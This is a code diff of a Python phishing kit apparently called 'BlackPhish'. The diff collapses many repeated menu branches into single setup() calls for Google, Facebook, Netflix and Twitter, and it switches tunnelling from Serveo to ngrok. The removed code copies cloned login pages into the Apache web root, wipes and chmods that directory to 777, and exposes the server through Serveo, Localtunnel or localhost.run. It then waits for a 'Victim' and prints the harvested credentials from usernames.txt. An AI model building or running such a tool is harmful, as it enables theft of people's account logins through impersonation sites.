-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
+        setup("Google")
 
 
 
     # Facebook #
     elif choice == '3':
-        print('\n')
-        print(red + '           [1]' + blue + ' Serveo (recommended)')
-        print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run')
-        print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [" + blue + "BlackPhish-Facebook" + red + "] -> ")
+        setup("Facebook")
 
-        if choice1 == '1':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
 
-        elif choice1 == '2':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/') 
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/') 
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
 
-        elif choice1 == '3':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '4':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Facebook", "Server/www") # Copies the entire folder of Websites/Facebook to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
+    # Netflix #
+    elif choice == '4':
+        setup("Netflix")
 
 
     # Twitter
     elif choice == "5":
-        print('\n')
-        print(red + '           [1]' + blue + ' Serveo (recommended)')
-        print(red + '           [2]' + blue + ' Localtunnel')
-        print(red + '           [3]' + blue + ' localhost.run')
-        print(red + '           [4]' + blue + ' Localhost only\n\n')
-        choice1 = input(red + "        [" + blue + "BlackPhish-Twitter" + red + "] -> ")
-
-        if choice1 == '1':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Twitter", "Server/www") # Copies the entire folder of Websites/Twitter to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '2':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/') 
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/') 
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Twitter", "Server/www") # Copies the entire folder of Websites/Twitter to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '3':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Twitter", "Server/www") # Copies the entire folder of Websites/Twitter to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward #
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True: # Waits for content on usernames.txt #
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
-
-        elif choice1 == '4':
-            system("clear")
-            print(green + '[+] Copying Files')
-            sleep(0.1)
-            print(green + '[+] Cleaning /var/www/html/')
-            sleep(0.1)
-            system('rm -r /var/www/html/ && mkdir /var/www/html/') # Removing then adding /var/www/html/ #
-            print(green + '[+] Cleaning /Server/www/')
-            sleep(0.1)
-            system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes then adds /Server/www #
-            dir_util.copy_tree("Websites/Twitter", "Server/www") # Copies the entire folder of Websites/Twitter to /Server/www #
-            redirect() # Redirect Prompt #
-            print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-            dir_util.copy_tree("Server/www", "/var/www/html") # Copies from Server/www to /var/www/html #
-            print(green + '[+] Copying to /var/www/html')
-            sleep(0.1)
-            system("chmod -R 777 /var/www/html") # Change file permission of /var/www/html #
-            print(green + '[+] Changing File Permissions')
-            sleep(0.1)
-            print(yellow + '[+] Starting Apache2 Service')
-            sleep(0.1)
-            system('service apache2 start') # Starts apache2 service #
-            print(green + '[+] Apache2 Service Started')
-            sleep(0.1)
-            print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
-            sleep(0.1)
-            print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-            sleep(0.1)
-            while True:
-                with open('/var/www/html/usernames.txt') as creds:
-                    lines = creds.read().rstrip()
-                    if len(lines) != 0:
-                        print(green + "______________________________________________________________________________\n")
-                        print('\n                CREDENTIALS FOUND\n\n')
-                        system("cat /var/www/html/usernames.txt")
-                        print("\n______________________________________________________________________________" + reset)
-                        endMessage()
+        setup("Twitter")
 
     # Clean out everything #
     elif choice == "0":
         print(green + '[+] Stopping Apache2 Service')
         system('service apache2 stop') # Stops apache2 service #
-        print(green + '[+] Stopping Traffic forwarding to serveo')
-        system('pkill -f inc0gnit0:80:localhost:80') # Stops serveo #
+        print(green + '[+] Stopping Traffic forwarding to ngrok')
+        system('pkill -f ngrok') # Stops ngrok #
         print(green + '[+] Cleaning /var/www/html/')
         system('rm -r /var/www/html/ && mkdir /var/www/html') # Removes and makes /var/www/html #
         print(green + '[+] Cleaning /Server/www/')
